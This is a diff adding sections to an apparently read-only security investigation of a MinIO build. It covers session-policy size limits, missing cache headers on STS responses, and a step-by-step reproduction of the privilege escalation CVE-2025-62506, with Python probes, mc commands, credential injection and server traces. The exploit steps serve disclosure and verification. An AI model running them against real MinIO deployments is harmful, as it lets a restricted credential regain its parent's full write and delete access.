+# policysize.py builds a policy inflated with indentation/whitespace to 2581 raw bytes,
+# whose canonical (compact) form is ~123 bytes, and calls AssumeRole with it.
+python3 policysize.py
+```
+
+```
+A raw>2048 whitespace, canonical short: raw=2581B canonical~=123B -> HTTP 200 ACCEPTED
+```
+
+*Case B — sweeping the canonical size one byte at a time locates the exact accept→reject boundary at 2,048 canonical bytes:*
+
+```bash
+# policysize_exact.py grows a Resource ARN until AssumeRole flips 200 -> 400.
+python3 policysize_exact.py
+```
+
+```
+largest ACCEPTED : key_len=1926 raw=2056B canonical(py-estimate)=2048B
+smallest REJECTED: key_len=1927 raw=2057B canonical(py-estimate)=2049B
+=> server boundary is on the RE-MARSHALED canonical policy (json.Marshal(sessionPolicy)=policyBuf), cap=2048
+```
+
+The earlier `INLINE_POLICY_BYTES=2230` rejection is consistent: that policy's ~2,100-character resource ARN makes its **canonical** form exceed 2,048 as well, so it is rejected on `len(policyBuf)`, not on its raw size. In short, a raw input may be arbitrarily larger than 2,048 bytes (up to the `stsRequestBodyLimit = 10 MiB` body ceiling, `cmd/sts-handlers.go:67`) provided the re-marshaled policy is ≤ 2,048 bytes; conversely a canonical policy of 2,049 bytes is rejected regardless of how the raw bytes were formatted.
 
 ### Responsible Code
 
@@ -2108,6 +2452,36 @@ ASSUMEROLE -> ERROR ClientError
 
 **[Observed] + [Source-grounded]** The `return isAllowedSP && (… combinedPolicy.IsAllowed(args))` at `cmd/iam.go:2312` is the intersection: a request is allowed only if **both** the inline session policy (`isAllowedSP`) **and** the parent/combined policy allow it. `PutObject` is allowed by the parent (baseline PUT → 200) but is absent from the session policy, so `isAllowedSP` is false and the temporary credential's PUT is denied (`403 AccessDenied`); `GetObject` is present in both, so it succeeds (200). Because `JWTSignWithAccessKey` (`credentials.go:340`) stamps the JWT `accessKey` claim with the credential's own access key, the issued `AccessKeyId`, the token's identity claim, and the `Credential=` of both S3 requests are necessarily the same value (`MYLCK9PTJE73DS0ADU0Y`) — a single credential exercised end-to-end, not a splice of separate sessions. The 2,048-byte cap (`sts-handlers.go:123-124`) further bounds how large an inline session policy may be.
 
+### STS success-response caching headers — defensive-hardening gap
+
+**[Observed]** A **successful** `AssumeRole` response carries the temporary credential (`AccessKeyId`, `SecretAccessKey`, `SessionToken`) in its XML body but does **not** set `Cache-Control: no-store` or `Pragma: no-cache`. Dumping the complete response header set of a `200 OK` `AssumeRole` confirms both cache-prevention headers are absent:
+
+```bash
+# stsheaders.py issues a boto3 AssumeRole and prints every response header + cache-header presence
+python3 stsheaders.py
+```
+
+```
+HTTP 200 on AssumeRole success
+--- ALL response headers (sorted) ---
+  accept-ranges: bytes
+  content-length: 1008
+  content-type: application/xml
+  date: Wed, 15 Jul 2026 06:05:42 GMT
+  server: MinIO
+  strict-transport-security: max-age=31536000; includeSubDomains
+  vary: Origin
+  x-amz-id-2: 6c9c1b272fe6760748470e090db0a5146c93f0aa66a8e75df9c426a9aab2430a
+  x-amz-request-id: 18C26171934B214C
+  x-content-type-options: nosniff
+  x-xss-protection: 1; mode=block
+--- cache-prevention header presence ---
+  Cache-Control present: False
+  Pragma present       : False
+```
+
+**Responsible code.** The success path `stsAPIHandlers.AssumeRole` (`cmd/sts-handlers.go:354-361`) builds the `AssumeRoleResponse` and calls `writeSuccessResponseXML(w, encodeResponse(assumeRoleResponse))` (`:361`) without setting any cache-prevention header, and no `Cache-Control`/`Pragma` is added anywhere else on the STS response path. Because the body carries short-lived secret material, a shared intermediary or client cache could retain it. **[Inferred]** the exposure is low in the canonical single-node setup (responses are transported directly over the authenticated TLS/HTTP connection with no intervening cache) but would matter behind a caching proxy. **Adding anti-caching headers is a source change and is therefore out of scope for this read-only investigation (MainRule); this documents the observed behavior only.**
+
 ### Known Session-Policy Bypass on This Build — CVE-2025-62506 (own-account service-account creation)
 
 > **Direct answer.** **[Observed]** The "narrow, never widen" property proven above holds only for **direct** S3/admin action authorization. On the checked-out HEAD it is **defeated** by one **own-account** administrative path: a credential whose inline session policy grants *only* `s3:GetObject` — and is therefore denied `PutObject`/`DeleteObject` directly — can **create a new service account for its own parent user**, and that new account is issued with **no** session policy (`Policy: implied`), so it inherits the **parent's full policy** and can `PutObject`/`DeleteObject` again. The restricted credential thus **re-widens back to the parent's entire permission set**. This is the published vulnerability **CVE-2025-62506 / GHSA-jjjj-jwhf-8rgr** ("Privilege Escalation via Session Policy Bypass in Service Accounts and STS", CVSS 8.1 High, `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`, CWE-863), which affects all MinIO versions **before** `RELEASE.2025-10-15T17-29-55Z`. The build under investigation predates the fix (see *Version position* below), so the bypass reproduces here. It is reported per the honesty rule; **no source file was modified** — this is an observed, version-scoped weakness of the deliverable's build, not a change to it.
@@ -2115,6 +2489,20 @@ ASSUMEROLE -> ERROR ClientError
 This section was reproduced on a **dedicated, isolated single-drive instance** (endpoint `http://127.0.0.1:9300`, data dir `/tmp/qa_cve62506/data`, torn down afterward) so it does not perturb the other requirements' fixtures. All access keys shown are non-secret identifiers; secret keys and session tokens are redacted (ephemeral, torn down).
 
 #### Reproduction
+
+**Dedicated fixture server (started once; fresh data dir; torn down at the end of this section).** The same canonical binary and invocation style as the primary server, on a distinct port and data dir so it cannot perturb the other requirements' fixtures:
+
+```bash
+mkdir -p /tmp/qa_cve62506/data /tmp/qa_cve62506/mc-config
+MINIO_ROOT_USER=minioadmin MINIO_ROOT_PASSWORD="<REDACTED_ROOT_PASSWORD>" \
+  setsid nohup /tmp/minio-bin server /tmp/qa_cve62506/data \
+  --address :9300 --console-address :9301 </dev/null >/tmp/qa_cve62506/server.log 2>&1 &
+# wait for readiness (HTTP 200 on the health gate)
+timeout 30 bash -c 'until curl -sf http://127.0.0.1:9300/minio/health/ready >/dev/null; do sleep 1; done'
+# root alias used ONLY for provisioning (qa); all deny/exploit triggers below are signed as non-root
+export MC_CONFIG_DIR=/tmp/qa_cve62506/mc-config
+mc alias set qa http://127.0.0.1:9300 minioadmin "<REDACTED_ROOT_PASSWORD>"
+```
 
 The parent `escparent` is a **non-admin** user with a broad-but-non-administrative S3 policy `escparentpol` (so a denial is meaningful and no `admin:*` action is present):
 
@@ -2164,29 +2552,74 @@ Setup (signed as root, `qa` alias):
 mc mb -p qa/escbucket
 printf 'parent-seed-object-body' | mc pipe qa/escbucket/seedobj
 mc admin policy create qa escparentpol pol/parent.json
-mc admin user add qa escparent <REDACTED_USER_SECRET>
+mc admin user add qa escparent "$USER_SECRET"
 mc admin policy attach qa escparentpol --user escparent
 # restricted child service account (session policy = GetObject only)
 mc admin user svcacct add qa escparent --access-key ESCCHILDKEY00000001 \
-   --secret-key <REDACTED_SECRET> --policy pol/child_getonly.json
+   --secret-key "$SECRET" --policy pol/child_getonly.json
 # control child (session policy explicitly denies admin:CreateServiceAccount)
 mc admin user svcacct add qa escparent --access-key ESCDENYKEY000000001 \
-   --secret-key <REDACTED_SECRET> --policy pol/child_denysvc.json
+   --secret-key "$SECRET" --policy pol/child_denysvc.json
 # alias authenticated AS the restricted child, and AS the control child
-mc alias set qachild http://127.0.0.1:9300 ESCCHILDKEY00000001 <REDACTED_SECRET>
-mc alias set qadeny  http://127.0.0.1:9300 ESCDENYKEY000000001 <REDACTED_SECRET>
+mc alias set qachild http://127.0.0.1:9300 ESCCHILDKEY00000001 "$SECRET"
+mc alias set qadeny  http://127.0.0.1:9300 ESCDENYKEY000000001 "$SECRET"
 ```
 
-The S3 probe `s3op.py` is a boto3 SigV4 client (`get`/`put`/`delete` against `escbucket/seedobj`), used to show byte-accurate status codes for each credential.
+The S3 probe `s3op.py` is a boto3 SigV4 client (`get`/`put`/`delete` against `escbucket/seedobj`), used to show byte-accurate status codes for each credential. It accepts an optional fourth positional argument (the STS session token) that is passed as `aws_session_token` so temporary credentials sign `X-Amz-Security-Token`:
+
+```python
+# s3op.py — boto3 SigV4 S3 probe against escbucket/seedobj
+# usage: s3op.py <get|put|delete> <access_key> <secret_key> [session_token]
+import sys, boto3
+from botocore.config import Config
+from botocore.exceptions import ClientError
+op, ak, sk = sys.argv[1], sys.argv[2], sys.argv[3]
+tok = sys.argv[4] if len(sys.argv) > 4 else None
+s3 = boto3.client("s3", endpoint_url="http://127.0.0.1:9300",
+                  aws_access_key_id=ak, aws_secret_access_key=sk, aws_session_token=tok,
+                  region_name="us-east-1", config=Config(signature_version="s3v4"))
+B, K = "escbucket", "seedobj"
+try:
+    if op == "get":
+        r = s3.get_object(Bucket=B, Key=K)
+        print(f"GetObject -> HTTP {r['ResponseMetadata']['HTTPStatusCode']} body= {r['Body'].read().decode()}")
+    elif op == "put":
+        r = s3.put_object(Bucket=B, Key=K, Body=b"overwritten-by-escalated-cred")
+        print(f"PutObject -> HTTP {r['ResponseMetadata']['HTTPStatusCode']}")
+    elif op == "delete":
+        r = s3.delete_object(Bucket=B, Key=K)
+        print(f"DeleteObject -> HTTP {r['ResponseMetadata']['HTTPStatusCode']}")
+except ClientError as e:
+    print(f"{op} -> ERROR {e.response['Error']['Code']}  HTTP= {e.response['ResponseMetadata']['HTTPStatusCode']}")
+```
+
+The STS helper `assumerole.py` mints a temporary credential for `escparent` scoped by the inline session policy `pol/child_getonly.json`, printing the HTTP status and the ephemeral access key and persisting `ak`/`sk`/`tok` to `tempcred.json` for the downstream steps (`$USER_SECRET` is `escparent`'s password):
+
+```python
+# assumerole.py — mint an STS temporary credential scoped by an inline session policy
+import boto3, json, os
+from botocore.config import Config
+getonly = open("pol/child_getonly.json").read()
+sts = boto3.client("sts", endpoint_url="http://127.0.0.1:9300",
+                   aws_access_key_id="escparent", aws_secret_access_key=os.environ["USER_SECRET"],
+                   region_name="us-east-1", config=Config(signature_version="s3v4"))
+r = sts.assume_role(RoleArn="arn:aws:iam::minio:role/dummy", RoleSessionName="qasess",
+                    Policy=getonly, DurationSeconds=900)
+c = r["Credentials"]
+print("ASSUMEROLE_HTTP=%d" % r["ResponseMetadata"]["HTTPStatusCode"])
+print("TEMP_AK=%s" % c["AccessKeyId"])
+json.dump({"ak": c["AccessKeyId"], "sk": c["SecretAccessKey"], "tok": c["SessionToken"]},
+          open("tempcred.json", "w"))
+```
 
 #### Observed output — Variant A (restricted **service account** child)
 
 **Baseline: the restricted child is genuinely narrowed on the direct path. [Observed]** GET is allowed by the session policy; PUT and DELETE are allowed by the parent but omitted from the session policy, so both are denied:
 
 ```bash
-python3 s3op.py get    ESCCHILDKEY00000001 <REDACTED_SECRET>
-python3 s3op.py put    ESCCHILDKEY00000001 <REDACTED_SECRET>
-python3 s3op.py delete ESCCHILDKEY00000001 <REDACTED_SECRET>
+python3 s3op.py get    ESCCHILDKEY00000001 "$SECRET"
+python3 s3op.py put    ESCCHILDKEY00000001 "$SECRET"
+python3 s3op.py delete ESCCHILDKEY00000001 "$SECRET"
 ```
 
 ```
@@ -2201,7 +2634,7 @@ delete -> ERROR AccessDenied
 
 ```bash
 mc admin user svcacct add qachild escparent \
-   --access-key ESCGRANDKEY0000002 --secret-key <REDACTED_SECRET>
+   --access-key ESCGRANDKEY0000002 --secret-key "$SECRET"
 echo "exit=$?"
 mc admin user svcacct info qa ESCGRANDKEY0000002
 ```
@@ -2219,9 +2652,9 @@ Policy: implied
 **Escalation confirmed: the new account exercises the parent's full scope. [Observed]** `PutObject` (200) and `DeleteObject` (204) now succeed — the exact actions denied to the restricted child that minted this account:
 
 ```bash
-python3 s3op.py get    ESCGRANDKEY0000002 <REDACTED_SECRET>
-python3 s3op.py put    ESCGRANDKEY0000002 <REDACTED_SECRET>
-python3 s3op.py delete ESCGRANDKEY0000002 <REDACTED_SECRET>
+python3 s3op.py get    ESCGRANDKEY0000002 "$SECRET"
+python3 s3op.py put    ESCGRANDKEY0000002 "$SECRET"
+python3 s3op.py delete ESCGRANDKEY0000002 "$SECRET"
 ```
 
 ```
@@ -2244,7 +2677,7 @@ mc: <ERROR> Unable to get service info. Access Denied.
 
 ```bash
 mc admin user svcacct add qadeny escparent \
-   --access-key ESCFAILKEY000000002 --secret-key <REDACTED_SECRET>
+   --access-key ESCFAILKEY000000002 --secret-key "$SECRET"
 echo "exit=$?"
 ```
 
@@ -2262,7 +2695,7 @@ exit=1
 127.0.0.1:9300 Host: 127.0.0.1:9300
 127.0.0.1:9300 X-Amz-Date: 20260715T020344Z
 127.0.0.1:9300 Accept-Encoding: zstd,gzip
-127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=ESCCHILDKEY00000001/20260715//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=0f8a6128ab8ef20579967bb9adc08c7e88181f019d8710f329167b7dbcaf3543
+127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=ESCCHILDKEY00000001/20260715//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9300 Content-Length: 152
 127.0.0.1:9300 User-Agent: MinIO (linux; amd64) madmin-go/3.0.70 mc/RELEASE.2025-08-13T08-35-41Z
 127.0.0.1:9300 X-Amz-Content-Sha256: f77b047ef7b44ce4da65808dbe2784897d64f0856841b7c36d1de39ad88d6138
@@ -2273,7 +2706,7 @@ exit=1
 
 ```
 127.0.0.1:9300 [REQUEST s3.PutObject] [2026-07-15T02:03:45.346] [Client IP: 127.0.0.1]
-127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=ESCGRANDKEY0000002/20260715/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-crc32;x-amz-content-sha256;x-amz-date;x-amz-sdk-checksum-algorithm, Signature=a9849a9765d7fbadeed8d2142125e8894267094e91b6531cdbe960026fa397e9
+127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=ESCGRANDKEY0000002/20260715/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-crc32;x-amz-content-sha256;x-amz-date;x-amz-sdk-checksum-algorithm, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9300 [RESPONSE] [2026-07-15T02:03:45.371] [ Duration 24.68ms TTFB 24.647333ms ↑ 204 B  ↓ 0 B ]
 127.0.0.1:9300 200 OK
 ```
@@ -2285,7 +2718,7 @@ The control's `admin.AddServiceAccount`, signed by the deny-child, is refused wi
 127.0.0.1:9300 PUT /minio/admin/v3/add-service-account
 127.0.0.1:9300 Proto: HTTP/1.1
 127.0.0.1:9300 Host: 127.0.0.1:9300
-127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=ESCDENYKEY000000001/20260715//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=ffb1569a584d0a9d33abc381975a5b23b40816d1eedd6f0f6c63253616360320
+127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=ESCDENYKEY000000001/20260715//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9300 Content-Length: 152
 127.0.0.1:9300 User-Agent: MinIO (linux; amd64) madmin-go/3.0.70 mc/RELEASE.2025-08-13T08-35-41Z
 127.0.0.1:9300 X-Amz-Content-Sha256: ca7ea66ffcd24b38afff728fd8d65451e0879a013884f0358a6b959b7d9ac11a
@@ -2298,24 +2731,125 @@ The control's `admin.AddServiceAccount`, signed by the deny-child, is refused wi
 
 #### Observed output — Variant B (restricted **STS** temporary credential)
 
-The vulnerability is not specific to service accounts; an STS `AssumeRole` credential with the same GetObject-only session policy behaves identically. `AssumeRole` returns a temporary credential (`HWKXAVYPUBFKT11ZE31T`); direct GET is allowed (200) and direct PUT denied (403), yet the temporary credential can still create a service account for its own parent (`Policy: implied`), which then PUTs successfully (200):
+The vulnerability is **not** specific to service accounts: an STS `AssumeRole` credential carrying the *same* GetObject-only session policy behaves identically. The temporary access key is **ephemeral** (regenerated on every `AssumeRole`) — the original investigation captured `HWKXAVYPUBFKT11ZE31T`; the self-contained re-run documented below captured `PON1IXE3P9VR5CADIYG8`. Both exhibit byte-identical behavior, which is itself the stability evidence.
+
+**Step B1 — mint the temporary credential (`assumerole.py`; session policy = GetObject only, 900 s). [Observed]** `assumerole.py` writes the ephemeral `ak`/`sk`/`tok` to `tempcred.json` for the downstream steps:
+
+```bash
+python3 assumerole.py
+```
 
 ```
 ASSUMEROLE_HTTP=200
-TEMP_AK=HWKXAVYPUBFKT11ZE31T           (secret + session token redacted — ephemeral 900s)
-TEMP GetObject -> HTTP 200 body= parent-seed-object-body
-TEMP PutObject -> ERROR AccessDenied   Code= AccessDenied HTTP= 403
-# exploit: STS temp cred (with X-Amz-Security-Token) creates svcacct for own parent
+TEMP_AK=PON1IXE3P9VR5CADIYG8            (SecretAccessKey + SessionToken redacted — ephemeral 900s)
+```
+
+**Step B2 — baseline: the temporary credential is genuinely narrowed on the direct path. [Observed]** GET (present in the session policy) succeeds; PUT (allowed by the parent, omitted from the session policy) is denied. The session token is passed as `aws_session_token`, so boto3 signs the `X-Amz-Security-Token` header:
+
+```bash
+TEMP_AK=$(python3 -c "import json;print(json.load(open('tempcred.json'))['ak'])")
+TEMP_SK=$(python3 -c "import json;print(json.load(open('tempcred.json'))['sk'])")
+TEMP_TOKEN=$(python3 -c "import json;print(json.load(open('tempcred.json'))['tok'])")
+python3 s3op.py get "$TEMP_AK" "$TEMP_SK" "$TEMP_TOKEN"
+python3 s3op.py put "$TEMP_AK" "$TEMP_SK" "$TEMP_TOKEN"
+```
+
+```
+GetObject -> HTTP 200 body= parent-seed-object-body
+put -> ERROR AccessDenied  HTTP= 403
+```
+
+**Step B3 — exploit: the temporary credential creates a service account for its own parent. [Observed]** `mc alias set` rejects raw STS credentials (they require a session token: *"The security token included in the request is invalid."*), so the temporary credential is injected directly into an `mc` alias config entry that carries the `sessionToken` field. The admin `AddServiceAccount` call is then signed by the temporary credential and **succeeds** (exit 0); the new account has `Policy: implied` and `ParentUser: escparent` (no session policy → inherits the parent's full policy):
+
+```bash
+# inject the STS temp cred (with sessionToken) as an mc alias 'qatemp'
+python3 - <<'PY'
+import json, os
+p = os.path.join(os.environ["MC_CONFIG_DIR"], "config.json")
+cfg = json.load(open(p)); tc = json.load(open("tempcred.json"))
+cfg["aliases"]["qatemp"] = {"url": "http://127.0.0.1:9300", "accessKey": tc["ak"],
+    "secretKey": tc["sk"], "sessionToken": tc["tok"], "api": "s3v4", "path": "auto"}
+json.dump(cfg, open(p, "w"), indent=2)
+PY
+mc admin user svcacct add qatemp escparent --access-key STSGRANDKEY0000001 --secret-key "$SECRET"
+echo "exit=$?"
+mc admin user svcacct info qa STSGRANDKEY0000001
+```
+
+```
 Access Key: STSGRANDKEY0000001
 Secret Key: <REDACTED_SECRET>
 Expiration: no-expiry
+exit=0
 AccessKey: STSGRANDKEY0000001
 ParentUser: escparent
+Status: on
+Name: 
+Description: 
 Policy: implied
-PutObject -> HTTP 200
+Expiration: no-expiry
 ```
 
-**Stability. [Observed]** Both variants were run twice with identical results (the trace above is from the second run); the outcome is stable, not timing-dependent.
+**Step B4 — escalation confirmed: the minted account exercises the parent's full scope. [Observed]** `PutObject` (200) and `DeleteObject` (204) now succeed — the exact actions the temporary credential that minted this account was denied:
+
+```bash
+python3 s3op.py get    STSGRANDKEY0000001 "$SECRET"
+python3 s3op.py put    STSGRANDKEY0000001 "$SECRET"
+python3 s3op.py delete STSGRANDKEY0000001 "$SECRET"
+```
+
+```
+GetObject -> HTTP 200 body= parent-seed-object-body
+PutObject -> HTTP 200
+DeleteObject -> HTTP 204
+```
+
+**Step B5 — impact bounded to the parent's scope, not `consoleAdmin`. [Observed]** The minted account inherits only the parent's (non-admin) S3 policy, so an admin call is refused — the escalation is a *scope escape back to the parent*, not a promotion to console admin:
+
+```bash
+mc alias set qagrandB http://127.0.0.1:9300 STSGRANDKEY0000001 "$SECRET"
+mc admin info qagrandB
+```
+
+```
+mc: <ERROR> Unable to get service info. Access Denied.
+```
+
+**Step B6 — control: an STS session policy that explicitly `Deny`s `admin:CreateServiceAccount` blocks the escalation. [Observed]** Minting a *second* temporary credential with `child_denysvc.json`, injecting it as `qatempdeny`, and repeating the identical exploit is refused (`Access Denied`, exit 1); no key is created — isolating the cause to the deny-vs-omit distinction, exactly as in Variant A:
+
+```bash
+# AssumeRole as escparent with Policy=pol/child_denysvc.json, inject as 'qatempdeny', then:
+mc admin user svcacct add qatempdeny escparent --access-key STSDENYKEY00000001 --secret-key "$SECRET"
+echo "exit=$?"
+mc admin user svcacct info qa STSDENYKEY00000001
+```
+
+```
+mc: <ERROR> Unable to add a new service account. Access Denied.
+exit=1
+mc: <ERROR> Unable to get information of the specified service account. The specified service account is not found (Specified service account does not exist).
+```
+
+**Step B7 — server-trace attribution (`mc admin trace --all --verbose --path '*add-service-account*' qa`). [Observed]** The escalating `admin.AddServiceAccount` is signed by the **temporary STS credential** — note `x-amz-security-token` in `SignedHeaders` and the `X-Amz-Security-Token:` request header (the STS session-token JWT, redacted) — and returns `200 OK`:
+
+```
+127.0.0.1:9300 [REQUEST admin.AddServiceAccount] [2026-07-15T06:02:21.019] [Client IP: 127.0.0.1]
+127.0.0.1:9300 PUT /minio/admin/v3/add-service-account
+127.0.0.1:9300 Proto: HTTP/1.1
+127.0.0.1:9300 Host: 127.0.0.1:9300
+127.0.0.1:9300 Accept-Encoding: zstd,gzip
+127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=PON1IXE3P9VR5CADIYG8/20260715//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date;x-amz-security-token, Signature=<REDACTED_SIGV4_SIGNATURE>
+127.0.0.1:9300 Content-Length: 155
+127.0.0.1:9300 User-Agent: MinIO (linux; amd64) madmin-go/3.0.70 mc/DEVELOPMENT.GOGET
+127.0.0.1:9300 X-Amz-Content-Sha256: ecd73590f15f1adb74089731244b142c4c598ec28900471ef4ca3a55905b52d9
+127.0.0.1:9300 X-Amz-Date: 20260715T060221Z
+127.0.0.1:9300 X-Amz-Security-Token: <REDACTED_STS_SESSION_TOKEN>
+127.0.0.1:9300 <BLOB>
+127.0.0.1:9300 [RESPONSE] [2026-07-15T06:02:21.087] [ Duration 68.081ms TTFB 68.071851ms ↑ 269 B  ↓ 182 B ]
+127.0.0.1:9300 200 OK
+```
+
+**Stability. [Observed]** Both variants were run at least twice with identical results; the STS exploit was additionally repeated across four distinct grand-child keys (`STSGRANDKEY0000009`–`0000012`), each returning `200 OK`. The outcome is stable, not timing-dependent.
 
 #### Root cause
 
@@ -2362,6 +2896,24 @@ git merge-base --is-ancestor c1a49490c78e9c3ebcad86ba0662319138ace190 HEAD && ec
 ```
 
 The fix adds a single corrective line — `sessionPolicyArgs.DenyOnly = false` — to **both** `isAllowedBySessionPolicyForServiceAccount` and `isAllowedBySessionPolicy`, with the explanatory comment: *"DenyOnly is used only for allowing an account to do actions related to its own account (like create service accounts for itself…). However when a session policy is present, we need to validate that the action is actually allowed, rather than checking if the action is only disallowed."* That is, after the fix the sub-policy is always evaluated in allow mode, so a session policy that merely omits `admin:CreateServiceAccount` no longer passes — closing the bypass. **Remediating the code is out of scope for this read-only investigation (MainRule); this section documents the observed behavior and its root cause only.**
+
+#### Dedicated fixture teardown
+
+**[Observed]** The dedicated `:9300` instance and all of its fixtures are removed at the end of this section, leaving no persistent artifact:
+
+```bash
+# stop only the dedicated :9300 server (never a blanket pkill — that would hit other instances)
+CVE_PID=$(pgrep -f "minio-bin server /tmp/qa_cve62506/data .*--address :9300")
+[ -n "$CVE_PID" ] && kill "$CVE_PID"
+# confirm the port is free, then delete the data dir, its mc-config, and the log
+timeout 10 bash -c 'while curl -sf http://127.0.0.1:9300/minio/health/ready >/dev/null 2>&1; do sleep 1; done'
+rm -rf /tmp/qa_cve62506
+echo "teardown exit=$?"
+```
+
+```
+teardown exit=0
+```
 
 ---
 
@@ -2530,7 +3082,7 @@ Client output. The signed request **carries `X-Amz-Content-Sha256`** and lists i
 ```text
 === HANDLER A: SetPolicyForUserOrGroup (r5basic self-attach consoleAdmin) ===
 --- Exact signed request headers sent by client ---
-  Authorization: AWS4-HMAC-SHA256 Credential=r5basic/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=605a22170c037ee6809fe3119db5e0b2652663ad9da4a9f76dfecdb0e4cc4a7f
+  Authorization: AWS4-HMAC-SHA256 Credential=r5basic/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
   X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
   X-Amz-Date: 20260714T213527Z
 SignedHeaders               = host;x-amz-content-sha256;x-amz-date
@@ -2554,7 +3106,7 @@ Server trace (complete and unedited; `mc admin trace -a -v --disable-pager`). It
 127.0.0.1:9000 X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 127.0.0.1:9000 X-Amz-Date: 20260714T213527Z
 127.0.0.1:9000 Accept-Encoding: identity
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r5basic/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=605a22170c037ee6809fe3119db5e0b2652663ad9da4a9f76dfecdb0e4cc4a7f
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r5basic/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 <BLOB>
 127.0.0.1:9000 [RESPONSE] [2026-07-14T21:35:27.098] [ Duration 216µs TTFB 195.685µs ↑ 104 B  ↓ 212 B ]
 127.0.0.1:9000 403 Forbidden
@@ -2604,7 +3156,7 @@ Audit-log record (complete and unedited; the raw compact record piped through `p
     },
     "requestHeader": {
         "Accept-Encoding": "identity",
-        "Authorization": "AWS4-HMAC-SHA256 Credential=r5basic/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=605a22170c037ee6809fe3119db5e0b2652663ad9da4a9f76dfecdb0e4cc4a7f",
+        "Authorization": "AWS4-HMAC-SHA256 Credential=r5basic/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>",
         "Connection": "close",
         "Content-Length": "0",
         "User-Agent": "Python-urllib/3.13",
@@ -2643,7 +3195,7 @@ Server trace (complete and unedited). The canonical `mc`/madmin request uses `Co
 127.0.0.1:9000 POST /minio/admin/v3/idp/builtin/policy/attach
 127.0.0.1:9000 Proto: HTTP/1.1
 127.0.0.1:9000 Host: 127.0.0.1:9000
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r5basic/20260714//s3/aws4_request, SignedHeaders=content-type;host;x-amz-content-sha256;x-amz-date, Signature=748e9ac3cb29714a8ca4d515215c00b16e06264867fce69e309084813c47e2e5
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r5basic/20260714//s3/aws4_request, SignedHeaders=content-type;host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 Content-Length: 103
 127.0.0.1:9000 Content-Type: application/octet-stream
 127.0.0.1:9000 User-Agent: MinIO (linux; amd64) madmin-go/3.0.70 mc/RELEASE.2025-08-13T08-35-41Z
@@ -2694,7 +3246,7 @@ Audit-log record (complete and unedited; piped through `python3 -m json.tool`). 
     "requestHost": "127.0.0.1:9000",
     "requestHeader": {
         "Accept-Encoding": "zstd,gzip",
-        "Authorization": "AWS4-HMAC-SHA256 Credential=r5basic/20260714//s3/aws4_request, SignedHeaders=content-type;host;x-amz-content-sha256;x-amz-date, Signature=748e9ac3cb29714a8ca4d515215c00b16e06264867fce69e309084813c47e2e5",
+        "Authorization": "AWS4-HMAC-SHA256 Credential=r5basic/20260714//s3/aws4_request, SignedHeaders=content-type;host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>",
         "Content-Length": "103",
         "Content-Type": "application/octet-stream",
         "User-Agent": "MinIO (linux; amd64) madmin-go/3.0.70 mc/RELEASE.2025-08-13T08-35-41Z",
@@ -2756,6 +3308,91 @@ $ mc admin logs --last 20 inv9000
 ```
 
 The only entry is an **unrelated** audit-webhook connectivity warning stamped `20:33:49` — roughly an hour before this test window (`21:35`), from a brief moment when the audit receiver was not yet listening at startup. There is **no** server error-log entry for either `403` denial: authorization denials are surfaced through the HTTP response and the audit log (both shown above), not the server error log. [Observed]
+
+#### Adversarial matrix — every attempt with its immediate mapping snapshot
+
+Beyond the two canonical self-attach paths above, the self-promotion was attempted **twenty** ways spanning both handlers and every malformation class the checkpoint enumerates — unsigned, malformed signature, URL-encoded target, duplicate parameter, harmless metacharacters (JSON-quote, path-traversal, shell, HTML), wrong body/content-type, wrong method, unknown route, and other/group targets. After **every** attempt the user→policy mapping was snapshotted; the digest never changed.
+
+**Mapping-snapshot method (byte-reproducible; timestamp-free). [Observed]** The snapshot hashes the combined user→policy mapping of `r5basic` **and** the user list of the `consoleAdmin` policy, so a successful promotion (via either side of the mapping) necessarily changes the digest:
+
+```python
+# r5_snapshot.py — canonical, timestamp-free mapping snapshot for the R5 invariant
+import subprocess, json, hashlib
+MC = "/tmp/bin/mc"; ALIAS = "inv9000"
+def entities(*args):
+    out = subprocess.check_output([MC,"admin","policy","entities",ALIAS,*args,"--json"], text=True)
+    d = json.loads(out).get("result", {}); d.pop("timestamp", None)   # strip the only volatile field
+    return d
